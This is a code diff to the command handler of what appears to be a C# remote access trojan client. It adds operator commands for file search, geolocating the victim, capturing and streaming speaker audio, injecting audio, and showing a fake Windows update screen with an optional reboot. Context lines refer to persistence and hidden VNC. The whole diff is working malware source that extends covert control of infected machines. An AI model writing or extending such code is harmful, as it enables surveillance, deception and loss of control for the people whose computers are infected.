@@ -985,6 +985,80 @@ internal class TlsClient : IDisposable
                         });
                     break;
 
+                // ── File Search ──────────────────────────────────────
+                case PacketType.FmSearch:
+                {
+                    var fsReq = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.FmSearchDataStub);
+                    if (fsReq != null)
+                    {
+                        var fsr = fsReq;
+                        _ = Task.Run(async () => await WritePacketAsync(new Packet
+                        {
+                            Type = PacketType.FmSearchResult,
+                            Data = FileSearchFeature.Search(fsr.Path, fsr.Pattern, fsr.Recursive, fsr.MaxResults)
+                        }, CancellationToken.None));
+                    }
+                    break;
+                }
+
+                // ── Geolocation ──────────────────────────────────────
+                case PacketType.GeoRequest:
+                    _ = Task.Run(async () => await WritePacketAsync(new Packet
+                    {
+                        Type = PacketType.GeoResult,
+                        Data = await GeoFeature.GetLocationAsync()
+                    }, CancellationToken.None));
+                    break;
+
+                // ── Speaker Loopback ─────────────────────────────────
+                case PacketType.SpeakerGetDevices:
+                    _ = WritePacketAsync(new Packet { Type = PacketType.SpeakerDevicesResult, Data = SpeakerFeature.GetDevices() }, ct);
+                    break;
+                case PacketType.SpeakerInjectStart:
+                {
+                    var inj = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.SpeakerInjectStartDataStub) ?? new();
+                    SpeakerFeature.StartInjection(inj.SampleRate, inj.Channels, inj.BitsPerSample);
+                    break;
+                }
+                case PacketType.SpeakerInjectData:
+                {
+                    var d = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.SpeakerDataStub);
+                    if (d != null && !string.IsNullOrEmpty(d.Data))
+                        SpeakerFeature.FeedInjection(Convert.FromBase64String(d.Data));
+                    break;
+                }
+                case PacketType.SpeakerInjectStop:
+                    _ = Task.Run(() => SpeakerFeature.StopInjection());
+                    break;
+                case PacketType.SpeakerStart:
+                {
+                    var spkStart = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.SpeakerStartDataStub) ?? new();
+                    var idx = spkStart.DeviceIndex;
+                    _ = Task.Run(() => SpeakerFeature.Start(idx,
+                        async data => await WritePacketAsync(new Packet { Type = PacketType.SpeakerData, Data = data }, CancellationToken.None, dropIfBusy: true)));
+                    break;
+                }
+                case PacketType.SpeakerStop:
+                    _ = Task.Run(() => SpeakerFeature.Stop());
+                    break;
+
+                // ── Fake Update Screen ───────────────────────────────
+                case PacketType.FakeUpdateStart:
+                {
+                    var fu  = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.FakeUpdateStartDataStub);
+                    var dur = fu?.DurationMinutes ?? 0;
+                    var reb = fu?.RebootAfter ?? false;
+                    _ = Task.Run(async () => await WritePacketAsync(new Packet
+                    {
+                        Type = PacketType.FakeUpdateAck,
+                        Data = FakeUpdateFeature.Start(dur, reb)
+                    }, CancellationToken.None));
+                    break;
+                }
+                case PacketType.FakeUpdateStop:
+                    _ = Task.Run(() => FakeUpdateFeature.Stop());
+                    break;
+
                 case PacketType.Disconnect:
                     ShouldReconnect = false;
                     Persistence.StopWatchdog();
@@ -2344,6 +2418,25 @@ internal enum PacketType
 
     WindowNotifyKeywords = 282,
     WindowNotifyAlert    = 283,
+
+    FakeUpdateStart = 284,
+    FakeUpdateStop  = 285,
+    FakeUpdateAck   = 286,
+
+    FmSearch       = 186,
+    FmSearchResult = 187,
+
+    GeoRequest = 195,
+    GeoResult  = 196,
+
+    SpeakerGetDevices    = 215,
+    SpeakerDevicesResult = 216,
+    SpeakerStart         = 217,
+    SpeakerStop          = 218,
+    SpeakerData          = 219,
+    SpeakerInjectStart   = 223,
+    SpeakerInjectStop    = 224,
+    SpeakerInjectData    = 225,
 }
 
 internal class Packet
@@ -2619,6 +2712,23 @@ internal class HvncProgressDataStub
 // Window Notify
 [JsonSerializable(typeof(WindowNotifyKeywordsStub))]
 [JsonSerializable(typeof(WindowNotifyAlertStub))]
+// File Search
+[JsonSerializable(typeof(FmSearchDataStub))]
+[JsonSerializable(typeof(FmSearchEntryStub))]
+[JsonSerializable(typeof(FmSearchResultStub))]
+[JsonSerializable(typeof(List<FmSearchEntryStub>))]
+// Geolocation
+[JsonSerializable(typeof(GeoResultStub))]
+// Speaker Loopback
+[JsonSerializable(typeof(SpeakerDeviceStub))]
+[JsonSerializable(typeof(SpeakerDevicesResultStub))]
+[JsonSerializable(typeof(SpeakerStartDataStub))]
+[JsonSerializable(typeof(SpeakerDataStub))]
+[JsonSerializable(typeof(SpeakerInjectStartDataStub))]
+[JsonSerializable(typeof(List<SpeakerDeviceStub>))]
+// Fake Update
+[JsonSerializable(typeof(FakeUpdateStartDataStub))]
+[JsonSerializable(typeof(FakeUpdateAckStub))]
 internal partial class SeroJson : JsonSerializerContext { }
 
 internal class CdpSignupStatusStub { public string Step { get; set; } = ""; public string Message { get; set; } = ""; }
